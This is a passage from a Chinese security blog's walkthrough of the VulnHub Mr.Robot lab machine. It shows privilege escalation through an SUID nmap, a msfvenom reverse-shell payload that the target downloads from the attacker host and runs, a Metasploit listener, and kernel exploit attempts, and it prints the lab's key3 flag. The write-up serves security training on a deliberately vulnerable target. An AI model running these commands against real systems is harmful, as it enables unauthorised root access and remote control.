+<h3 id="3-7-1-Linux-提权信息收集"><a href="#3-7-1-Linux-提权信息收集" class="headerlink" title="3.7.1  Linux 提权信息收集"></a>3.7.1  Linux 提权信息收集</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">id</span>                      <span class="comment"># 查看当前用户UID/GID、所属用户组，判断是否有特权组</span></span><br><span class="line"><span class="built_in">sudo</span> -l                 <span class="comment"># 列出当前用户可执行的sudo权限；查看是否有免密sudo命令</span></span><br><span class="line"><span class="built_in">uname</span> -a                <span class="comment"># 打印内核版本、系统信息，用于查找内核漏洞提权</span></span><br><span class="line">find / -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null   <span class="comment"># 全盘查找SUID(4000)文件，2&gt;/dev/null丢弃权限报错</span></span><br><span class="line">crontab -l              <span class="comment"># 查看【当前用户】的定时任务，看是否存在可劫持脚本</span></span><br><span class="line"><span class="built_in">ls</span> -la /home/robot      <span class="comment"># 查看robot家目录所有文件，包含隐藏文件，寻找密钥/密码/备份</span></span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120476877_l881yh.webp" loading='lazy'></p>
+<p> UID=1002，**不是 root (0），**普通用户，无额外特权  </p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120478057_40k822.webp" loading='lazy'></p>
+<p> robot<strong>没有 sudo 权限</strong></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120479176_q9ipeb.webp" loading='lazy'></p>
+<p> 内核版本：Linux 3.13.0-55-generic  </p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120480513_8ov06y.webp" loading='lazy'></p>
+<p>/usr/local/bin/nmap 带有 SUID 权限  </p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120481978_xmg9gt.webp" loading='lazy'></p>
+<p> robot 用户<strong>没有个人定时任务</strong></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120483226_5htvb0.webp" loading='lazy'></p>
+<p>key2 我们已经找到了</p>
+<hr>
+<h3 id="3-7-2-Nmap-SUID-提权"><a href="#3-7-2-Nmap-SUID-提权" class="headerlink" title="3.7.2 Nmap SUID 提权"></a>3.7.2 Nmap SUID 提权</h3><p>原理： SUID 权限，会让程序运行时，继承这个程序文件所有者的身份，而不是当前运行人的身份。</p>
+<ol>
+<li>看 nmap 这个文件的权限</li>
+</ol>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l /usr/local/bin/nmap</span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120484656_uya0hs.webp" loading='lazy'></p>
+<p> 文件所有者是<code>root</code>，所以任何人运行这个 nmap 程序，进程的 euid 都会变成这个文件的属主 root。  </p>
+<hr>
+<ol start="2">
+<li>老版本 Nmap ≤4.x   自带 <code>--interactive</code> 交互式模式。</li>
+</ol>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120486810_m3kvr4.webp" loading='lazy'></p>
+<hr>
+<ol start="3">
+<li><code>!sh</code></li>
+</ol>
+<p><code>!</code>  后面跟系统命令，用 nmap 当前进程的身份去执行这条系统命令</p>
+<p><code>!sh</code> = 执行 <code>/bin/sh</code>，弹出一个新的 shell 窗口。  </p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/bin/nmap --interactive  </span><br><span class="line">!sh</span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120488277_zflkz5.webp" loading='lazy'></p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /root/key-3-of-3.txt</span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120490005_1a4rd2.webp" loading='lazy'></p>
+<p>key3：04787ddef27c3dee1ee161b21670b4e4</p>
+<hr>
+<h3 id="Q：shell-补充"><a href="#Q：shell-补充" class="headerlink" title="Q：shell 补充"></a>Q：shell 补充</h3><table>
+<thead>
+<tr>
+<th>程序</th>
+<th>全称</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>/bin/sh</code></td>
+<td>Bourne Shell</td>
+<td>最古老基础 shell，很多系统是软链接到 dash</td>
+</tr>
+<tr>
+<td><code>/bin/bash</code></td>
+<td>Bourne Again Shell</td>
+<td>我们最常用的，Ubuntu/Kali 默认 shell</td>
+</tr>
+<tr>
+<td><code>/bin/dash</code></td>
+<td>Debian Almquist Shell</td>
+<td>轻量版 sh，Ubuntu 里 /bin/sh 实际指向 dash</td>
+</tr>
+</tbody></table>
+<hr>
+<h1 id="四、为什么放弃内核-exp-这条路？"><a href="#四、为什么放弃内核-exp-这条路？" class="headerlink" title="四、为什么放弃内核 exp 这条路？"></a>四、为什么放弃内核 exp 这条路？</h1><blockquote>
+<p>****注意！！！*<em><strong>由于我</strong>不是用 MSF 拿到的初始 shell</em>*（通过 web 漏洞拿到普通 bash），所以现在 MSF 里没有 meterpreter 会话，<strong>直接跑 MSF 内核提权模块是跑不了的</strong>。  </p>
+</blockquote>
+<h2 id="4-1-使用-MSF"><a href="#4-1-使用-MSF" class="headerlink" title="4.1 使用 MSF"></a>4.1 使用 MSF</h2><h3 id="1-使用-searchsploit-查找对应漏洞"><a href="#1-使用-searchsploit-查找对应漏洞" class="headerlink" title="1. 使用 searchsploit 查找对应漏洞"></a>1. 使用 searchsploit 查找对应漏洞</h3><p>Linux 3.13.0-55-generic  </p>
+<blockquote>
+<p>作用：在Exploit-DB漏洞库，搜索该内核可用EXP，找出CVE编号，判断能不能用MSF模块</p>
+</blockquote>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 搜索：linux内核 3.13 ubuntu 本地提权</span></span><br><span class="line">searchsploit linux kernel 3.13 ubuntu <span class="built_in">local</span> privilege escalation</span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120491651_e43eft.webp" loading='lazy'></p>
+<hr>
+<h3 id="2-Kali打开msfconsole"><a href="#2-Kali打开msfconsole" class="headerlink" title="2. Kali打开msfconsole"></a>2. Kali打开msfconsole</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -q</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="3-搜索MSF内对应的-overlayfs-模块"><a href="#3-搜索MSF内对应的-overlayfs-模块" class="headerlink" title="3. 搜索MSF内对应的 overlayfs  模块"></a>3. 搜索MSF内对应的 overlayfs  模块</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search overlayfs</span><br></pre></td></tr></tbody></table></figure>
+
+<p>返回模块：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120493748_u5wyl3.webp" loading='lazy'></p>
+<hr>
+<h3 id="5-加载这个漏洞模块"><a href="#5-加载这个漏洞模块" class="headerlink" title="5. 加载这个漏洞模块"></a>5. 加载这个漏洞模块</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use 7</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="6-查看模块需要配置的选项"><a href="#6-查看模块需要配置的选项" class="headerlink" title="6. 查看模块需要配置的选项"></a>6. 查看模块需要配置的选项</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120495466_jxu9v6.webp" loading='lazy'></p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> SESSION 1</span><br><span class="line"><span class="built_in">set</span> LHOST 10.0.2.15</span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120497143_j591k5.webp" loading='lazy'></p>
+<hr>
+<h3 id="7-运行"><a href="#7-运行" class="headerlink" title="7. 运行"></a>7. 运行</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run</span><br><span class="line"><span class="comment"># 或者 exploit</span></span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120498591_sqqs6a.webp" loading='lazy'></p>
+<hr>
+<h3 id="8-获取meterpreter会话"><a href="#8-获取meterpreter会话" class="headerlink" title="8. 获取meterpreter会话"></a>8. 获取meterpreter会话</h3><blockquote>
+<p>核心思路：拿到普通 shell（已拿到） → 上传 meterpreter 木马 → MSF 监听 → 获取 meterpreter 会话 → 在 MSF 内做本地提权</p>
+</blockquote>
+<ol>
+<li>生成meterpreter反弹木马，上传靶机执行</li>
+</ol>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># kali生成linux x64 meterpreter</span></span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=9999 -f elf &gt; shell.elf</span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120500275_68mnof.webp" loading='lazy'></p>
+<hr>
+<ol start="2">
+<li>kali开启监听：</li>
+</ol>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 10.0.2.15</span><br><span class="line"><span class="built_in">set</span> LPORT 9999</span><br><span class="line">run</span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120502127_2hbnlq.webp" loading='lazy'></p>
+<hr>
+<ol start="3">
+<li>靶机上传 <code>shell.elf</code>，加执行权限运行，得到meterpreter会话。</li>
+</ol>
+<p>在 Kali，<strong>shell.elf 所在的文件夹</strong>执行：</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></tbody></table></figure>
+
+<p>作用：把当前文件夹变成 web 服务，靶机可以通过 wget 下载文件</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120503802_pk8ym7.webp" loading='lazy'></p>
+<p>然后<strong>回到靶机已有的 robot 普通 shell</strong>里执行下载：</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget http://10.0.2.15:8000/shell.elf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 备选上传方式（wget 不行的时候用）</span></span><br><span class="line">curl 下载：curl http://10.0.2.15:8000/shell.elf -o shell.elf</span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120505115_b0w3hb.webp" loading='lazy'></p>
+<p>赋予执行权限，运行木马</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x shell.elf</span><br><span class="line">./shell.elf</span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120506376_qg9h7s.webp" loading='lazy'></p>
+<p>执行后，<strong>切回 MSF 监听窗口</strong>，收到 meterpreter 会话！</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120507700_y1ujjq.webp" loading='lazy'></p>
+<p>收到会话后提示符：<code>meterpreter &gt;</code>。</p>
+<hr>
+<h3 id="9-把之前的再执行一遍"><a href="#9-把之前的再执行一遍" class="headerlink" title="9. 把之前的再执行一遍"></a>9. 把之前的再执行一遍</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先后台挂起meterpreter</span></span><br><span class="line">background</span><br><span class="line"></span><br><span class="line"><span class="comment"># 切回msf，加载这个exp</span></span><br><span class="line">use exploit/linux/local/overlayfs_priv_esc</span><br><span class="line"><span class="built_in">set</span> SESSION 1</span><br><span class="line"><span class="built_in">set</span> LHOST 10.0.2.15</span><br><span class="line">run</span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120509029_3351vq.webp" loading='lazy'></p>
+<p>这个 exp 打不了 ，但是我们之前用searchsploit 查找了对应漏洞，可以选择自己下载。</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120491651_e43eft.webp" loading='lazy'></p>
+<hr>
+<h3 id="10-先-kali-编译，再让靶机下载"><a href="#10-先-kali-编译，再让靶机下载" class="headerlink" title="10. 先 kali 编译，再让靶机下载"></a>10. 先 kali 编译，再让靶机下载</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 把exp从exploitdb复制到当前文件夹</span><br><span class="line">searchsploit -m 37292</span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120510477_3wop8y.webp" loading='lazy'></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Kali编译</span><br><span class="line">gcc 37292.c -o exp</span><br></pre></td></tr></tbody></table></figure>
+
+<p>****但是！！！****编译报错了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120511840_3lex05.webp" loading='lazy'></p>
+<p>我们用searchsploit 查找的相关漏洞其实绝大多数对这个靶机内核 3.13.0-55 无效， 列表里剩下的 45010 / 44298 / 43418 等，漏洞触发条件是 4.x 内核，<strong>3.13 根本不适用。</strong></p>
+<div class="post-extras-series"><div class="pes-title">📚 同系列文章 · vulnhub（2 篇）</div><ol><li><a href="/2026/08/19/Basic_Pentesting_1_Walkthrough/">Basic Pentesting 1 Walkthrough</a></li><li class="current">Mr.Robot: 1 Walkthrough<span class="pes-cur">（本文）</span></li></ol></div><blockquote>
+<p>本文为个人学习笔记，如有错误或疏漏，欢迎批评指正。‌‌‌‌‌‌‌‌‌​​‌​‌​‌‍‌‌‌‌‌‌‌‌‌​​‌‌‌‌​‍‌‌‌‌‌‌‌‌‌​​​‌‌​​‍‌‌‌‌‌‌‌‌‌​​‌​​‌​‍‌‌‌‌‌‌‌‌‌​​‌​‌‌​‍‌‌‌‌‌‌‌‌‌​​‌​​​‌‍‌‌‌‌‌‌‌‌‌​​‌‌​‌​‍‌‌‌‌‌‌‌‌‌‌​‌​​‌​‍‌‌‌‌‌‌‌‌‌​​‌​‌‌​‍‌‌‌‌‌‌‌‌‌​​​‌‌​‌‍‌‌‌‌‌‌‌‌‌​​‌​‌‌​‍‌‌‌‌‌‌‌‌‌​​​‌‌​​‍‌‌‌‌‌‌‌‌‌‌​‌​​​‌‍‌‌‌‌‌‌‌‌‌​​​‌​‌‌‍‌‌‌‌‌‌‌‌‌​​‌​​​​‍‌‌‌‌‌‌‌‌‌​​​‌‌‌‌‍</p>
+</blockquote>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://jasmine-iris.top">Jasmine_Iris</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://jasmine-iris.top/2026/09/11/Mr.Robot_1_Walkthrough/">https://jasmine-iris.top/2026/09/11/Mr.Robot_1_Walkthrough/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://jasmine-iris.top" target="_blank">Jasmine_Iris</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/MSF/">MSF</a><a class="post-meta__tags" href="/tags/%E9%9D%B6%E6%9C%BA/">靶机</a><a class="post-meta__tags" href="/tags/%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/">内核漏洞</a></div><div class="post-share"><div class="social-share" data-image="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/cover.webp" data-sites="wechat,qzone,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/09/07/%E6%A2%A6%E4%B9%8B%E5%85%89%E8%8A%92%E7%9A%84%E5%B0%8F%E6%B8%B8%E6%88%8F/" title="梦之光芒的小游戏"><img class="cover" src="https://img.jasmine-iris.top/posts/梦之光芒的小游戏/cover.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post" loading='lazy'><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">梦之光芒的小游戏</div></div><div class="info-2"><div class="info-item-1">Monyer 小游戏（monyer.com/game/game1）1-15 关通关全记录：源码查看、控制台调试、字符编码解密、Cookie/URL 参数篡改、反射型 XSS 超链接注入、SQL 万能密码与 UPX 脱壳逆向，逐关 payload 与思路解析</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/08/19/Basic_Pentesting_1_Walkthrough/" title="Basic Pentesting 1 Walkthrough"><img class="cover" src="https://img.jasmine-iris.top/posts/Basic_Pentesting_1_Walkthrough/cover.webp" alt="cover" loading='lazy'><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-08-19</div><div class="info-item-2">Basic Pentesting 1 Walkthrough</div></div><div class="info-2"><div class="info-item-1">VulnHub Basic Pentesting 1 靶机渗透完整复现：ProFTPD 1.3.3c 后门（MSF 与手动两种路径）、WordPress Web 渗透+内核提权，以及 wpscan/gobuster/searchsploit 工具详解</div></div></div></a><a class="pagination-related" href="/2026/07/11/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="MSF的使用以及漏洞复现"><img class="cover" src="https://img.jasmine-iris.top/posts/MSF的使用以及漏洞复现/cover.webp" alt="cover" loading='lazy'><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-07-11</div><div class="info-item-2">MSF的使用以及漏洞复现</div></div><div class="info-2"><div class="info-item-1">MSF渗透测试框架的使用方法、常见漏洞复现（MS08-067、MS10-018、CVE-2017-7494、CVE-2012-1823）及msfvenom木马生成</div></div></div></a></div></div><hr class="custom-hr"><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://img.jasmine-iris.top/img/photo.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar" loading='lazy'></div><div class="author-info-name">Jasmine_Iris</div><div class="author-info-description">Jasmine_Iris 的网络安全学习博客：渗透测试、CTF 题解与漏洞复现笔记。</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">28</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">24</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">21</div></a></div><a id="card-info-btn" target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/Jasmineee007"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Jasmineee007" rel="external nofollow noreferrer" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://gitee.com/jasminee0762" rel="external nofollow noreferrer" target="_blank" title="Gitee"><i class="fab fa-gitee" style="color: #c71d23;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客~ 📝<br><hr>最近更新：2026-09-11<br><br>新增文章：<br><a href="/2026/09/11/Mr.Robot_1_Walkthrough/">Mr.Robot: 1 Walkthrough</a><br></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-text">一、靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">二、信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-0-%E7%A1%AE%E5%AE%9A-kali-%E7%9A%84-IP"><span class="toc-text">2.0 确定 kali 的 IP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E6%89%BE%E9%9D%B6%E6%9C%BA-IP"><span class="toc-text">2.1 找靶机 IP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-text">2.2 端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-%E8%AE%BF%E9%97%AE-http-10-0-2-3"><span class="toc-text">2.3 访问 http://10.0.2.3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-4-%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4"><span class="toc-text">2.4 目录爆破</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">三、漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-%E8%AE%BF%E9%97%AE-robots-txt"><span class="toc-text">3.1 访问 /robots.txt</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-%E7%99%BB%E5%BD%95-WordPress"><span class="toc-text">3.2 登录 WordPress</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-1-%E7%88%86%E7%A0%B4%E7%94%A8%E6%88%B7%E5%90%8D"><span class="toc-text">3.2.1 爆破用户名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-2-%E7%88%86%E7%A0%B4%E5%AF%86%E7%A0%81"><span class="toc-text">3.2.2 爆破密码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-%E4%BB%8E%E5%90%8E%E5%8F%B0%E5%88%B0-shell"><span class="toc-text">3.3 从后台到 shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-1-%E8%AF%84%E8%AE%BA%E5%8A%9F%E8%83%BD%E5%AD%98%E5%9C%A8-XSS"><span class="toc-text">3.3.1 评论功能存在 XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-2-%E5%8F%91%E7%8E%B0%E4%BA%86%E4%B8%BB%E9%A2%98%E6%96%87%E4%BB%B6%E7%BC%96%E8%BE%91%E5%99%A8"><span class="toc-text">3.3.2 发现了主题文件编辑器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-3-%E4%B8%8A%E4%BC%A0-webshell"><span class="toc-text">3.3.3 上传 webshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-4-%E6%89%BE%E5%85%B6%E4%BB%96%E7%9A%84-key"><span class="toc-text">3.4 找其他的 key</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#key1"><span class="toc-text">key1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#key2"><span class="toc-text">key2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E8%AF%BB%E5%8F%96-key2"><span class="toc-text">1. 读取 key2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90"><span class="toc-text">2. 查看文件权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E8%AF%BB-password-raw-md5"><span class="toc-text">3. 读 password.raw-md5</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-5-%E5%8D%87%E7%BA%A7%E6%88%90%E4%BA%A4%E4%BA%92%E5%BC%8F-shell"><span class="toc-text">3.5 升级成交互式 shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-5-1-PHP-%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5-shell-%E8%84%9A%E6%9C%AC"><span class="toc-text">3.5.1 PHP 反向连接 shell 脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-5-2-%E8%AE%BF%E9%97%AE%EF%BC%9A-http-10-0-2-3-wp-admin-abc-php"><span class="toc-text">3.5.2 访问： http://10.0.2.3/wp-admin/abc.php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-5-3-TTY-%E4%BA%A4%E4%BA%92%E5%BC%8F%E5%8D%87%E7%BA%A7"><span class="toc-text">3.5.3 TTY 交互式升级</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%8E%9F%E7%90%86"><span class="toc-text">1. 原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%8D%87%E7%BA%A7%E5%91%BD%E4%BB%A4"><span class="toc-text">2. 升级命令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" 